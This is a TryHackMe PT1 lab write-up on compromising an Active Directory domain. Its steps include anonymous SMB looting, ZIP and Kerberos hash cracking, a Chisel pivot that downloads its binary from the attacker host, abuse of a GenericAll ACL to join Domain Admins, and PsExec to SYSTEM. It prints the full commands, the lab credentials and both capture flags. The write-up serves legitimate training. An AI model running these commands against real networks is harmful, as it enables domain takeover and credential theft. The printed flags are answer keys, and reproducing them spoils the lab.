# PT1 Certification — Active Directory

## Overview

This section documents the **Active Directory** stage of my TryHackMe PT1 certification.

The assessment involved a Windows domain environment with:

```text
Domain: TRYHACKME
FQDN: tryhackme.loc

WRK: 10.200.150.20
DC:  10.200.150.10
```

The objective was to compromise the domain environment, move from the workstation to the Domain Controller, enumerate Active Directory, identify an attack path to Domain Admin, and finally obtain SYSTEM access on the DC.

The complete attack chain was:

```text
WRK
 ↓
Anonymous SMB
 ↓
Safe share
 ↓
creds.zip
 ↓
Offline ZIP cracking
 ↓
John : VerySafePassword!
 ↓
WinRM
 ↓
TRYHACKME\john
 ↓
WRK
 ↓
Chisel Pivot
 ↓
DC
 ↓
Authenticated AD Enumeration
 ↓
SPN Enumeration
 ↓
Kerberoasting
 ↓
j.phillips : Welcome1
 ↓
BloodHound
 ↓
GenericAll → Domain Admins
 ↓
Add j.phillips to Domain Admins
 ↓
Administrative SMB
 ↓
PsExec
 ↓
SYSTEM
 ↓
DC Flag
```

---

# 01 — WRK Initial Enumeration

## Target

```text
Host: 10.200.150.20
Role: Domain-joined Windows workstation/server
Hostname: WRK
Domain: TRYHACKME
DNS Domain: tryhackme.loc
FQDN: WRK.tryhackme.loc
```

I started with a full TCP scan:

```bash
nmap -Pn -sS -p- -n --min-rate 1000 10.200.150.20
```

The important open ports were:

```text
135    msrpc
139    netbios-ssn
445    microsoft-ds / SMB
3389   RDP
5985   WinRM
47001  WinRM
49664+
49665+
49666+
49667+
49668+
49669+
49670+
49679+
49680+
```

This immediately identified the host as a Windows machine exposing:

```text
SMB
RPC
RDP
WinRM
```

The presence of WinRM on:

```text
5985/tcp
```

was particularly interesting because valid Windows credentials could potentially provide remote PowerShell access.

---

# 02 — Anonymous SMB Enumeration

I first tested whether SMB allowed anonymous access:

```bash
smbclient -L //10.200.150.20 -N
```

SMB was accessible anonymously.

The interesting share was:

```text
Safe
```

I connected to it:

```bash
smbclient //10.200.150.20/Safe -N
```

The share contained:

```text
creds.zip
```

This was immediately interesting because an anonymous share containing a credentials archive could potentially lead to initial access.

The reasoning was:

```text
Anonymous SMB
 ↓
Interesting share
 ↓
Sensitive file
 ↓
Potential credential disclosure
```

---

# 03 — Investigating `creds.zip`

I first tried normal extraction:

```bash
unzip creds.zip
```

This failed with:

```text
unsupported compression method 99
```

I switched to 7-Zip:

```bash
7z l -slt creds.zip
```

The archive contained:

```text
Path = creds.txt
Size = 23
Encrypted = +
Method = AES-256 Deflate
```

So I had:

```text
creds.zip
 ↓
AES-256 encrypted
 ↓
creds.txt
```

At this point I needed to recover the ZIP password.

---

# 04 — Offline Password Cracking

I converted the ZIP into a John the Ripper hash:

```bash
zip2john creds.zip > creds.hash
```

The resulting hash was in:

```text
$zip2$
```

format.

I checked the available wordlists:

```bash
ls /usr/share/wordlists/
```

The available lists included:

```text
rockyou.txt
SecLists
fasttrack.txt
```

I used `rockyou.txt`:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt creds.hash
```

The ZIP password was recovered:

```text
Passw0rd
```

An important point here is that this was **offline password cracking**.

I was not spraying passwords against a live AD account, so there was no account-lockout risk.

---

# 05 — Extracting the Credentials

I extracted the encrypted archive:

```bash
7z x creds.zip -p'Passw0rd'
```

Then read the credentials file:

```bash
cat creds.txt
```

The contents were:

```text
John
VerySafePassword!
```

So I now had:

```text
Username: John
Password: VerySafePassword!
```

The next step was to determine whether these were valid domain credentials.

---

# 06 — Domain Enumeration

I ran:

```bash
enum4linux-ng -A 10.200.150.20
```

Important discoveries included:

```text
NetBIOS computer name: WRK
NetBIOS domain name: TRYHACKME
DNS domain: tryhackme.loc
FQDN: WRK.tryhackme.loc
```

Therefore:

```text
WRK
 ↓
Domain Member
 ↓
TRYHACKME
 ↓
tryhackme.loc
```

SMB security information also showed:

```text
SMB signing required: false
```

This was an interesting configuration weakness, although it was not required for the successful compromise.

Anonymous enumeration had limitations.

LDAP was not available from the workstation:

```text
389 → connection refused
636 → connection refused
```

SMB was accessible:

```text
445 → accessible
139 → accessible
```

RPC null sessions were technically allowed, but sensitive enumeration returned:

```text
STATUS_ACCESS_DENIED
```

For example:

```text
enumdomusers → STATUS_ACCESS_DENIED
```

So anonymous RPC did not provide useful user/group enumeration.

---

# 07 — Hostname Resolution

After discovering the internal domain and hostnames, I added them to `/etc/hosts`:

```text
10.200.150.20   WRK.tryhackme.loc WRK
10.200.150.10   tryhackme.loc
```

I then tested resolution:

```bash
ping WRK.tryhackme.loc
```

Result:

```text
WRK.tryhackme.loc → 10.200.150.20
```

This confirmed that local hostname resolution was working.

---

# 08 — Initial Access to WRK

WRK exposed WinRM:

```text
5985/tcp
```

I therefore tested the credentials recovered from the SMB share:

```bash
evil-winrm -i 10.200.150.20 -u John -p 'VerySafePassword!'
```

Authentication was successful.

Inside the shell:

```cmd
whoami
```

Result:

```text
tryhackme\john
```

I checked the hostname:

```cmd
hostname
```

Result:

```text
WRK
```

This confirmed the foothold:

```text
Anonymous SMB
 ↓
creds.zip
 ↓
ZIP password cracking
 ↓
John : VerySafePassword!
 ↓
WinRM
 ↓
TRYHACKME\john
 ↓
WRK
```

---

# 09 — WRK Flag

Before attempting unnecessary privilege escalation, I checked whether the required flag was already accessible:

```cmd
type C:\flag.txt
```

The flag was:

```text
THM{01e1185a-6e7c-459e-ae68-73930d86def3}
```

Therefore the WRK objective was complete.

---

# 10 — Windows Privilege Enumeration

I checked the privileges of the current account:

```cmd
whoami /priv
```

Important results:

```text
SeBackupPrivilege             Enabled
SeChangeNotifyPrivilege       Enabled
SeIncreaseWorkingSetPrivilege Enabled
```

The interesting privilege was:

```text
SeBackupPrivilege
```

`SeBackupPrivilege` can be significant during Windows privilege escalation because it can allow backup-style access to data despite normal filesystem ACL restrictions.

However, I did **not** use it to obtain the WRK flag.

This was an important lesson:

```text
Interesting privilege
        ≠
Required exploitation path
```

I also checked group membership:

```cmd
whoami /groups
```

Important groups included:

```text
BUILTIN\Remote Management Users
BUILTIN\Users
```

There was no obvious:

```text
BUILTIN\Administrators
```

membership.

So the account was not simply an Administrator account.

---

# 11 — Pivot: WRK → Domain Controller

After compromising WRK, I needed to reach the Domain Controller.

The DC was:

```text
10.200.150.10
```

From WRK I tested SMB:

```powershell
Test-NetConnection 10.200.150.10 -Port 445
```

Result:

```text
TcpTestSucceeded : True
```

I also tested LDAP:

```powershell
Test-NetConnection 10.200.150.10 -Port 389
```

Result:

```text
TcpTestSucceeded : True
```

I then queried the domain controller:

```cmd
nltest /dsgetdc:tryhackme.loc
```

The result identified:

```text
DC:     \\DC.tryhackme.loc
IP:     10.200.150.10
Domain: tryhackme.loc
```

The important observation was:

```text
AttackBox
    ↓
X
    ↓
DC

WRK
    ↓
✓
    ↓
DC
```

The AttackBox could not directly reach the required AD services, while the compromised WRK machine could.

Therefore WRK became my pivot point.

---

# 12 — Chisel Pivot

I used Chisel to expose the DC services through the compromised WRK host.

On the AttackBox:

```bash
chisel server --reverse --socks5 -p 8000
```

I transferred Chisel to WRK:

```powershell
Invoke-WebRequest http://10.250.1.6:8001/chisel.exe -OutFile C:\Windows\Temp\chisel.exe
```

I then forwarded the required DC ports.

SMB:

```cmd
C:\Windows\Temp\chisel.exe client 10.250.1.6:8000 R:445:10.200.150.10:445
```

LDAP:

```cmd
C:\Windows\Temp\chisel.exe client 10.250.1.6:8000 R:389:10.200.150.10:389
```

Kerberos:

```cmd
C:\Windows\Temp\chisel.exe client 10.250.1.6:8000 R:88:10.200.150.10:88
```

The resulting mapping was:

```text
127.0.0.1:445 → DC:445
127.0.0.1:389 → DC:389
127.0.0.1:88  → DC:88
```

The final pivot looked like:

```text
AttackBox
    ↓
Chisel
    ↓
WRK
    ↓
DC
```

This allowed me to perform LDAP, Kerberos and SMB enumeration of the DC from the AttackBox.

---

# 13 — Authenticated Active Directory Enumeration

I now had valid domain credentials:

```text
Username: John
Password: VerySafePassword!
Domain: TRYHACKME
```

I authenticated to the DC through the pivot:

```bash
rpcclient -U 'TRYHACKME/John%VerySafePassword!' 127.0.0.1
```

I enumerated users and groups:

```text
enumdomusers
enumdomgroups
querygroupmem 0x200
querygroupmem 0x459
querygroupmem 0x45a
```

Interesting privileged groups included:

```text
Domain Admins
Enterprise Admins
Tier 0 Admins
Tier 1 Admins
Tier 2 Admins
```

The Domain Admins group contained:

```text
Administrator
g.duncan
```

Tier 1 Admins included:

```text
t1_r.conway
t1_n.marsh
t1_j.hutchinson
```

At this stage I had moved from simple Windows host enumeration into actual Active Directory enumeration.

---

# 14 — SPN Enumeration

I next looked for accounts with Service Principal Names.

I used LDAP:

```bash
ldapsearch -x \
  -H ldap://127.0.0.1:389 \
  -D 'John@tryhackme.loc' \
  -w 'VerySafePassword!' \
  -b 'DC=tryhackme,DC=loc' \
  '(servicePrincipalName=*)' \
  sAMAccountName servicePrincipalName
```

An interesting result was:

```text
j.phillips
HTTP/csm.tryhackme.loc
```

This was important because an account associated with an SPN can potentially be targeted with Kerberoasting.

My reasoning was:

```text
SPN
 ↓
Service account
 ↓
Request TGS
 ↓
Offline cracking
 ↓
Potential credentials
```

---

# 15 — Kerberoasting

I requested a TGS for:

```text
j.phillips
```

using:

```bash
/root/impacket-venv/bin/GetUserSPNs.py \
  -k \
  -no-pass \
  -dc-ip 127.0.0.1 \
  -dc-host DC.tryhackme.loc \
  -request-user j.phillips \
  'TRYHACKME.LOC/John'
```

The resulting TGS hash was:

```text
$krb5tgs$23$*j.phillips$TRYHACKME.LOC$...
```

I saved the hash to:

```text
/tmp/jphillips.hash
```

Then cracked it offline with Hashcat:

```bash
hashcat -m 13100 /tmp/jphillips.hash /usr/share/wordlists/rockyou.txt
```

The password was recovered:

```text
j.phillips : Welcome1
```

The complete Kerberoasting chain was:

```text
SPN
 ↓
TGS Request
 ↓
Kerberoasting
 ↓
Offline password cracking
 ↓
j.phillips : Welcome1
```

This gave me a new set of domain credentials.

---

# 16 — BloodHound Enumeration

I authenticated as:

```text
j.phillips
```

and collected ACL information using BloodHound:

```bash
bloodhound-python \
  -d tryhackme.loc \
  -u j.phillips \
  -p 'Welcome1' \
  -ns 127.0.0.1 \
  -dc DC.tryhackme.loc \
  -c ACL \
  --zip \
  --disable-autogc \
  --auth-method ntlm
```

The collection returned:

```text
112 users
57 groups
2 computers
```

The important part was not the number of objects, but the relationships between them.

BloodHound revealed:

```text
J.PHILLIPS@TRYHACKME.LOC
        |
        | GenericAll
        ↓
DOMAIN ADMINS@TRYHACKME.LOC
```

This was the critical finding.

---

# 17 — Understanding `GenericAll`

`GenericAll` represented a powerful ACL permission.

In this case:

```text
j.phillips
     ↓
GenericAll
     ↓
Domain Admins
```

This meant that `j.phillips` could modify the privileged **Domain Admins** group.

Therefore, the privilege-escalation path was:

```text
j.phillips
 ↓
GenericAll over Domain Admins
 ↓
Modify Domain Admins membership
 ↓
Add j.phillips
 ↓
Domain Admin
```

This was the actual successful AD privilege-escalation path.

---

# 18 — Exploiting GenericAll

I used `bloodyAD` to add `j.phillips` to the Domain Admins group:

```bash
bloodyAD \
  -d tryhackme.loc \
  -u j.phillips \
  -p 'Welcome1' \
  --host DC.tryhackme.loc \
  --dc-ip 127.0.0.1 \
  add groupMember "Domain Admins" j.phillips
```

The result was:

```text
[+] j.phillips added to Domain Admins
```

I then verified the membership:

```bash
bloodyAD \
  -d tryhackme.loc \
  -u j.phillips \
  -p 'Welcome1' \
  --host DC.tryhackme.loc \
  --dc-ip 127.0.0.1 \
  get membership j.phillips
```

The result confirmed:

```text
Domain Admins
Administrators
Users
Domain Users
...
```

So the account had successfully become a member of:

```text
Domain Admins
```

---

# 19 — Verify Administrative Access

I verified the resulting privileges using NetExec:

```bash
netexec smb 127.0.0.1 \
  -u j.phillips \
  -p 'Welcome1' \
  -d TRYHACKME
```

The result was:

```text
[+] TRYHACKME\j.phillips:Welcome1 (Pwn3d!)
```

This confirmed administrative SMB access to the Domain Controller.

At this point the attack path was:

```text
John
 ↓
Kerberoasting
 ↓
j.phillips
 ↓
BloodHound
 ↓
GenericAll
 ↓
Domain Admins
 ↓
Administrative SMB
```

---

# 20 — SMB / C$ Access

I connected to the administrative C$ share:

```bash
smbclient //127.0.0.1/C$ \
  -U 'TRYHACKME/j.phillips%Welcome1'
```

The `flag.txt` file was visible, but direct download returned:

```text
NT_STATUS_ACCESS_DENIED
```

Therefore, instead of relying on direct file retrieval, I used remote command execution.

---

# 21 — PsExec → SYSTEM

I used Impacket PsExec:

```bash
psexec.py \
  'TRYHACKME/j.phillips:Welcome1@127.0.0.1'
```

PsExec successfully provided a shell on the Domain Controller.

The important concept behind the attack was:

```text
Domain Admin
    ↓
Administrative SMB
    ↓
ADMIN$
    ↓
PsExec
    ↓
Remote Service
    ↓
SYSTEM shell
```

This gave me command execution on the DC with SYSTEM privileges.

---

# 22 — Domain Controller Flag

From the DC shell I read:

```cmd
type C:\flag.txt
```

The DC flag was:

```text
THM{925068e3-c361-4cdf-9154-2a69adcb534f}
```

The Active Directory objective was now complete.

---

# 23 — Final Attack Chain

The complete AD attack chain was:

```text
10.200.150.20 — WRK
        ↓
Anonymous SMB
        ↓
Safe share
        ↓
creds.zip
        ↓
AES-256 encrypted ZIP
        ↓
zip2john
        ↓
John the Ripper
        ↓
ZIP password: Passw0rd
        ↓
creds.txt
        ↓
John : VerySafePassword!
        ↓
WinRM : 5985
        ↓
TRYHACKME\john
        ↓
WRK
        ↓
Test connectivity to DC
        ↓
Chisel Pivot
        ↓
10.200.150.10 — DC
        ↓
Authenticated AD Enumeration
        ↓
SPN Enumeration
        ↓
j.phillips
        ↓
Kerberoasting
        ↓
TGS Hash
        ↓
Hashcat
        ↓
j.phillips : Welcome1
        ↓
BloodHound
        ↓
GenericAll → Domain Admins
        ↓
Add j.phillips to Domain Admins
        ↓
Domain Admin
        ↓
Administrative SMB
        ↓
PsExec
        ↓
SYSTEM
        ↓
C:\flag.txt
        ↓
THM{925068e3-c361-4cdf-9154-2a69adcb534f}
```

---

# 24 — Flags

## WRK

```text
THM{01e1185a-6e7c-459e-ae68-73930d86def3}
```

## Domain Controller

```text
THM{925068e3-c361-4cdf-9154-2a69adcb534f}
```

---

# 25 — Important Findings

## Anonymous SMB Credential Disclosure

The `Safe` SMB share was accessible anonymously and contained:

```text
creds.zip
```

This ultimately exposed valid domain credentials.

The important chain was:

```text
Anonymous SMB
 ↓
Sensitive archive
 ↓
Offline password cracking
 ↓
Domain credentials
```

---

## Weak Password Protection

The ZIP password was:

```text
Passw0rd
```

which was recoverable using a common wordlist.

The archive therefore did not provide meaningful protection against offline password cracking.

---

## Kerberoasting

The account:

```text
j.phillips
```

had:

```text
HTTP/csm.tryhackme.loc
```

as an SPN.

This allowed a TGS to be requested and cracked offline, resulting in:

```text
j.phillips : Welcome1
```

---

## Critical AD ACL Misconfiguration

The most important AD finding was:

```text
J.PHILLIPS
     ↓
GenericAll
     ↓
Domain Admins
```

This allowed the compromised account to add itself to the Domain Admins group.

This was the **actual successful privilege-escalation path**.

---

# 26 — Things I Did NOT Use

During the assessment I discovered other potentially interesting security conditions, but they were not part of the successful attack chain.

### `SeBackupPrivilege`

The account `john` had:

```text
SeBackupPrivilege
```

enabled.

However, I did not exploit it.

The WRK flag was already accessible directly after obtaining the WinRM foothold.

Therefore:

```text
SeBackupPrivilege
≠
Successful exploitation path
```

---

### DCSync

DCSync was not exploited.

The successful AD escalation was:

```text
Kerberoasting
 ↓
j.phillips credentials
 ↓
BloodHound
 ↓
GenericAll
 ↓
Domain Admins
```

I did not claim DCSync as part of the compromise.

---

# 27 — Pentesting Lessons

This was probably the most important section of the PT1 assessment for me because it combined several different areas of penetration testing into one attack chain.

## 1. Anonymous access can be valuable

I should always test anonymous SMB access:

```bash
smbclient -L //TARGET -N
```

Even when anonymous RPC enumeration is restricted, SMB shares can still expose sensitive files.

The reasoning is:

```text
Anonymous access
 ↓
Shares
 ↓
Files
 ↓
Credentials
 ↓
Authentication
```

---

## 2. Crack files offline when possible

When I found:

```text
creds.zip
```

I did not start blindly spraying passwords against accounts.

Instead:

```text
creds.zip
 ↓
zip2john
 ↓
John
 ↓
Password
```

Offline cracking is preferable when possible because it avoids account lockout and authentication noise.

---

## 3. Always validate recovered credentials

Finding:

```text
John : VerySafePassword!
```

did not automatically mean that these were valid AD credentials.

I tested them against:

```text
WinRM
```

and confirmed:

```text
TRYHACKME\john
```

This turned a credential-disclosure finding into an actual initial-access path.

---

## 4. Understand the network from the compromised host

The AttackBox could not directly reach the DC's required services.

WRK could.

Therefore:

```text
Compromised WRK
 ↓
Network access
 ↓
DC
```

became an important pivoting opportunity.

This reinforced that after compromising a host, I should ask:

```text
What can this machine reach
that I cannot reach directly?
```

---

## 5. Active Directory enumeration is about relationships

The most valuable BloodHound result was not simply the number of users or groups.

It was:

```text
j.phillips
     ↓
GenericAll
     ↓
Domain Admins
```

This showed why AD attacks are heavily based on understanding relationships and ACLs.

---

## 6. Don't stop after obtaining credentials

After Kerberoasting I obtained:

```text
j.phillips : Welcome1
```

I could authenticate, but that was not the end of the attack.

I continued with:

```text
Authenticated enumeration
 ↓
BloodHound
 ↓
ACL analysis
 ↓
GenericAll
 ↓
Domain Admins
```

The important mindset is:

```text
New credentials
 ↓
What can this identity access?
 ↓
What permissions does it have?
 ↓
What relationships does it have?
 ↓
Can those permissions lead to privilege escalation?
```

---

## 7. Don't exploit everything you discover

During the WRK stage I discovered:

```text
SeBackupPrivilege
```

It was interesting, but it was not necessary.

The flag was already accessible.

So I did not waste time forcing a privilege-escalation path that was not required.

The better methodology was:

```text
Find interesting condition
 ↓
Determine whether it is relevant
 ↓
Check current objective
 ↓
Use the simplest valid attack path
```

---

# 28 — Tools Used

The main tools used during this stage were:

```text
Nmap
smbclient
7-Zip
zip2john
John the Ripper
enum4linux-ng
Evil-WinRM
PowerShell
Test-NetConnection
nltest
Chisel
rpcclient
ldapsearch
Impacket GetUserSPNs
Hashcat
BloodHound
bloodyAD
NetExec
Impacket PsExec
```

---

# 29 — Useful Commands

### Network Enumeration

```bash
nmap -Pn -sS -p- -n --min-rate 1000 10.200.150.20
```

### Anonymous SMB

```bash
smbclient -L //10.200.150.20 -N
```

```bash
smbclient //10.200.150.20/Safe -N
```

### ZIP Cracking

```bash
7z l -slt creds.zip
```

```bash
zip2john creds.zip > creds.hash
```

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt creds.hash
```

### WinRM

```bash
evil-winrm -i 10.200.150.20 -u John -p 'VerySafePassword!'
```

### Windows Enumeration

```cmd
whoami
hostname
whoami /priv
whoami /groups
whoami /all
```

### Connectivity Testing

```powershell
Test-NetConnection 10.200.150.10 -Port 445
Test-NetConnection 10.200.150.10 -Port 389
```

### Domain Controller Discovery

```cmd
nltest /dsgetdc:tryhackme.loc
```

### RPC Enumeration

```bash
rpcclient -U 'TRYHACKME/John%VerySafePassword!' 127.0.0.1
```

```text
enumdomusers
enumdomgroups
querygroupmem 0x200
querygroupmem 0x459
querygroupmem 0x45a
```

### LDAP / SPN Enumeration

```bash
ldapsearch -x \
  -H ldap://127.0.0.1:389 \
  -D 'John@tryhackme.loc' \
  -w 'VerySafePassword!' \
  -b 'DC=tryhackme,DC=loc' \
  '(servicePrincipalName=*)' \
  sAMAccountName servicePrincipalName
```

### Kerberoasting

```bash
GetUserSPNs.py \
  -k \
  -no-pass \
  -dc-ip 127.0.0.1 \
  -dc-host DC.tryhackme.loc \
  -request-user j.phillips \
  'TRYHACKME.LOC/John'
```

### Hashcat

```bash
hashcat -m 13100 /tmp/jphillips.hash /usr/share/wordlists/rockyou.txt
```

### BloodHound

```bash
bloodhound-python \
  -d tryhackme.loc \
  -u j.phillips \
  -p 'Welcome1' \
  -ns 127.0.0.1 \
  -dc DC.tryhackme.loc \
  -c ACL \
  --zip \
  --disable-autogc \
  --auth-method ntlm
```

### GenericAll Exploitation

```bash
bloodyAD \
  -d tryhackme.loc \
  -u j.phillips \
  -p 'Welcome1' \
  --host DC.tryhackme.loc \
  --dc-ip 127.0.0.1 \
  add groupMember "Domain Admins" j.phillips
```

### Verify Membership

```bash
bloodyAD \
  -d tryhackme.loc \
  -u j.phillips \
  -p 'Welcome1' \
  --host DC.tryhackme.loc \
  --dc-ip 127.0.0.1 \
  get membership j.phillips
```

### Administrative Access

```bash
netexec smb 127.0.0.1 \
  -u j.phillips \
  -p 'Welcome1' \
  -d TRYHACKME
```

### PsExec

```bash
psexec.py \
  'TRYHACKME/j.phillips:Welcome1@127.0.0.1'
```

---

# 30 — Final Assessment Summary

The Active Directory stage required chaining multiple vulnerabilities and misconfigurations rather than relying on one direct exploit.

The complete progression was:

```text
Anonymous SMB
        ↓
Credential Disclosure
        ↓
Offline Password Cracking
        ↓
Valid Domain Credentials
        ↓
WinRM Initial Access
        ↓
WRK
        ↓
Network Pivot
        ↓
DC Access
        ↓
Authenticated AD Enumeration
        ↓
SPN Discovery
        ↓
Kerberoasting
        ↓
Credential Recovery
        ↓
j.phillips
        ↓
BloodHound ACL Enumeration
        ↓
GenericAll
        ↓
Domain Admins
        ↓
Domain Admin
        ↓
Administrative SMB
        ↓
PsExec
        ↓
SYSTEM
        ↓
Domain Controller Flag
```

The most important lesson from this stage was that **Active Directory exploitation is often about chaining seemingly separate weaknesses**.

A useful mental model for future AD assessments is:

```text
Initial Access
 ↓
Who am I?
 ↓
What domain am I in?
 ↓
What can I reach?
 ↓
What credentials can I find?
 ↓
What users/groups exist?
 ↓
What SPNs exist?
 ↓
Can I Kerberoast?
 ↓
What permissions does my account have?
 ↓
What does BloodHound show?
 ↓
Which ACL relationship gives me the shortest path?
 ↓
Can I become Domain Admin?
 ↓
Can I execute commands on the DC?
 ↓
SYSTEM
```

For this assessment, the decisive relationship was:

```text
J.PHILLIPS
     ↓
GenericAll
     ↓
Domain Admins
     ↓
Domain Admin
     ↓
PsExec
     ↓
SYSTEM
```

That was the successful Active Directory compromise path.